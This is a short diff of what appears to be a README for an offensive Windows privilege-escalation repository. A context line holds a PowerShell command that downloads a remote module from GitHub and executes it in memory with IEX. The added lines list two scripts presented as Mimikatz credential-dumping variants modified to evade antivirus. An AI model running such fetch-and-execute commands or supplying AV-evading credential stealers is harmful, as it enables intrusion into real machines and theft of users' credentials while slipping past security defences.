@@ -31,3 +31,9 @@ Get-SPM.psm1:
 
 IEX (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/pand0rausa/WinEscalation-/master/Get-SPM.psm1")
 
+Mimikitten mod to avoid AV
+mimikitt.ps1
+
+
+Mimikatz mod to avoid AV
+mimi.ps1
